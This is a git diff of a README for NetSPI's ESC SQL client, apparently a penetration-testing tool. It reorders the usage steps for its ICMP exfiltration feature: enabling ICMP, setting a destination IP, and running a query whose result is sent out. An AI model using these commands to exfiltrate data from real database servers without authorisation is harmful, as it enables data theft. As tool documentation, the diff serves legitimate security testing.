@@ -224,13 +224,13 @@ Below are some quick instructions for running ESC functions through PowerShell.
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport1.png)<br>
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport2.png)<br>
  
- `set icmp enabled`
+ `set icmp enabled` <br>
+ `set icmpip 192.168.1.1`
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil1.png)<br>
  
- `set icmpip 192.168.1.1`
+  `select @@version`
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil12.png)<br>
  
- `select @@version`
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil3.png)<br>
 
  
